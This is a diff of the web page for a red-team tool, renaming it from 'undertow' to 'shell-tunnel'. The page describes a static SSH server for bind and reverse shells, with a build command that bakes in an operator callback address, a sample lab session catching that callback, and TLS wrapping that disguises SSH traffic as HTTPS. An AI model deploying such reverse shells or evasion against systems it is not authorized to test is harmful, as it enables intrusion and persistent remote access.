@@ -3,17 +3,17 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>undertow: static SSH server for bind and reverse shells with PTY and SFTP</title>
+<title>shell-tunnel: static SSH server for bind and reverse shells with PTY and SFTP</title>
 <meta name="description" content="Static SSH server for bind and reverse shells with PTY and SFTP">
-<link rel="canonical" href="https://real-fruit-snacks.github.io/Undertow/">
-<meta property="og:title" content="undertow">
+<link rel="canonical" href="https://real-fruit-snacks.github.io/shell-tunnel/">
+<meta property="og:title" content="shell-tunnel">
 <meta property="og:description" content="Static SSH server for bind and reverse shells with PTY and SFTP">
 <meta property="og:type" content="website">
-<meta property="og:url" content="https://real-fruit-snacks.github.io/Undertow/">
-<meta property="og:image" content="https://real-fruit-snacks.github.io/Undertow/assets/cover-dark.png">
+<meta property="og:url" content="https://real-fruit-snacks.github.io/shell-tunnel/">
+<meta property="og:image" content="https://real-fruit-snacks.github.io/shell-tunnel/assets/cover-dark.png">
 <meta property="og:image:width" content="1200">
 <meta property="og:image:height" content="560">
-<meta property="og:image:alt" content="undertow: a tuned static binary on the target becomes a PTY shell for the operator's plain ssh client">
+<meta property="og:image:alt" content="shell-tunnel: a tuned static binary on the target becomes a PTY shell for the operator's plain ssh client">
 <meta name="twitter:card" content="summary_large_image">
 <link rel="icon" href="favicon.ico" sizes="32x32">
 <link rel="icon" href="icon.svg" type="image/svg+xml">
@@ -37,20 +37,20 @@
 <link rel="stylesheet" href="rfs-components.css">
 <link rel="stylesheet" href="styles.css">
 </head>
-<body class="rfs-shell is-tow">
+<body class="rfs-shell is-tunnel">
 <a class="rfs-skip" href="#build">Skip to the build line</a>
 
 <header class="rfs-shell-header top">
     <div class="wrap top-inner">
         <a class="brand" href="https://real-fruit-snacks.github.io/">
             <img class="brand-tile" src="icon.svg" alt="" width="28" height="28">
-            <span class="brand-text">UNDERTOW</span>
+            <span class="brand-text">SHELL_TUNNEL</span>
         </a>
         <nav class="top-nav" aria-label="Links">
             <a href="#what">What's in it</a>
             <a href="#tested">Tested on</a>
             <a href="#issues">Known issues</a>
-            <a href="https://github.com/Real-Fruit-Snacks/Undertow">GitHub</a>
+            <a href="https://github.com/Real-Fruit-Snacks/shell-tunnel">GitHub</a>
         </nav>
         <button class="theme-btn" type="button" id="theme" aria-pressed="false" aria-label="Switch to LX 512 light theme">
             <span class="theme-dot" aria-hidden="true"></span>
@@ -63,12 +63,12 @@
 <div class="rfs-scroll-region page-scroll" id="page-scroll">
 <main class="wrap stack">
 <section class="card first" aria-labelledby="top-h">
-    <p class="runhead"><b>undertow 1.3.0</b><span>Windows · Linux · macOS</span><span>Go, one static binary</span><span>GPLv3</span></p>
+    <p class="runhead"><b>shell-tunnel 1.3.0</b><span>Windows · Linux · macOS</span><span>Go, one static binary</span><span>GPLv3</span></p>
     <div class="hero">
         <div>
-            <h1 class="title" id="top-h">undertow</h1>
+            <h1 class="title" id="top-h">shell-tunnel</h1>
             <p class="lead">Static SSH server for bind and reverse shells with PTY and SFTP</p>
-            <p class="sub">I wanted a tiny way to get a good reverse shell and a pivot without juggling listeners and tunnel syntax by hand. undertow is that errand as one static binary: credentials and connection details are baked in at build time, the target runs it, and a plain <code>ssh</code> client gets a full PTY, SFTP file transfer and all three kinds of port forwarding. Optional TLS wrapping hides the SSH banner inside what looks like HTTPS. It assumes you have written authorization for the target. undertow is the preservation fork of Ferdinor's undertow (2021), whose upstream repository is no longer public — same GPLv3, modernized and maintained. For authorized security testing only.</p>
+            <p class="sub">I wanted a tiny way to get a good reverse shell and a pivot without juggling listeners and tunnel syntax by hand. shell-tunnel is that errand as one static binary: credentials and connection details are baked in at build time, the target runs it, and a plain <code>ssh</code> client gets a full PTY, SFTP file transfer and all three kinds of port forwarding. Optional TLS wrapping hides the SSH banner inside what looks like HTTPS. It assumes you have written authorization for the target. shell-tunnel is the preservation fork of Ferdinor's shell-tunnel (2021), whose upstream repository is no longer public — same GPLv3, modernized and maintained. For authorized security testing only.</p>
             <ol class="ck steps" id="errand-ck" aria-label="The errand, start to finish">
                 <li id="build" data-state="todo"><span class="box" aria-hidden="true"></span><span class="ch">Build</span><span class="ld" aria-hidden="true"></span><span class="rs">Tuned binary</span>
                     <div class="act"><div class="cmd"><code>./build.sh reverse 10.10.14.5:4444</code><button class="copy" type="button" data-copy="./build.sh reverse 10.10.14.5:4444">Copy</button></div>
@@ -85,7 +85,7 @@
         <figure class="display" aria-labelledby="session-cap">
             <div class="screenbox">
                 <p class="bar" aria-hidden="true"><b>A lab run</b><span>zsh · kali</span></p>
-<pre class="screen" id="screen" tabindex="0" aria-label="An undertow run: build a tuned binary, start the handler, catch the callback, ssh in"><code><span class="ln"><span class="p">$</span> <span class="t">./build.sh reverse 10.10.14.5:4444</span></span>
+<pre class="screen" id="screen" tabindex="0" aria-label="An shell-tunnel run: build a tuned binary, start the handler, catch the callback, ssh in"><code><span class="ln"><span class="p">$</span> <span class="t">./build.sh reverse 10.10.14.5:4444</span></span>
 <span class="ln o">[i] Mode:     reverse</span>
 <span class="ln o">[i] Target:   svc@10.10.14.5:4444</span>
 <span class="ln o">[i] BindPort: random (allocated by SSH server)</span>
@@ -96,7 +96,7 @@
 <span class="ln o">[i] Listening on port:  4444</span>
 <span class="ln o">[i] Expecting callback: 10.10.14.5</span>
 <span class="ln" data-step="3"><span class="s">[ok]</span> listening on 0.0.0.0:4444</span>
-<span class="ln o">··· undertow.exe runs on the target ···</span>
+<span class="ln o">··· shell-tunnel.exe runs on the target ···</span>
 <span class="ln" data-step="4"><span class="s">[ok]</span> New connection from 10.10.11.23: svc on web01 reachable via 127.0.0.1:4444</span>
 
 <span class="ln"><span class="p">$</span> <span class="t">ssh -p 4444 svc@127.0.0.1</span></span>
@@ -120,7 +120,7 @@
     <div class="cols">
         <ul class="ck spec">
             <li><span class="ch">Reverse shells</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>reverse</code></span>
-                <p class="why">The binary dials home through egress firewalls and asks your undertow listener for a bind port — random by default, pinned with <code>-b</code>. The auto-generated handler script starts the listener, shows the password, and prints the exact <code>ssh</code> command when the callback lands.</p></li>
+                <p class="why">The binary dials home through egress firewalls and asks your shell-tunnel listener for a bind port — random by default, pinned with <code>-b</code>. The auto-generated handler script starts the listener, shows the password, and prints the exact <code>ssh</code> command when the callback lands.</p></li>
             <li><span class="ch">Bind shells</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>listen</code></span>
                 <p class="why">The binary listens on the target and you SSH straight to it. Same session features as reverse mode, nothing else to run.</p></li>
             <li><span class="ch">Full PTY</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>pty</code></span>
@@ -173,8 +173,8 @@
 </main>
 
 <footer class="wrap foot">
-    <p>GPLv3 — fork of Ferdinor's undertow (2021). For authorized security testing with explicit written permission only.</p>
-    <p><a href="https://github.com/Real-Fruit-Snacks/Undertow">Source</a> · <a href="https://github.com/Real-Fruit-Snacks/Undertow/blob/main/CHANGELOG.md">Changelog</a> · <a href="https://github.com/Real-Fruit-Snacks/Undertow/blob/main/SECURITY.md">Security</a> · <a href="https://real-fruit-snacks.github.io/">RFS</a></p>
+    <p>GPLv3 — fork of Ferdinor's shell-tunnel (2021). For authorized security testing with explicit written permission only.</p>
+    <p><a href="https://github.com/Real-Fruit-Snacks/shell-tunnel">Source</a> · <a href="https://github.com/Real-Fruit-Snacks/shell-tunnel/blob/main/CHANGELOG.md">Changelog</a> · <a href="https://github.com/Real-Fruit-Snacks/shell-tunnel/blob/main/SECURITY.md">Security</a> · <a href="https://real-fruit-snacks.github.io/">RFS</a></p>
 </footer>
 </div>
 
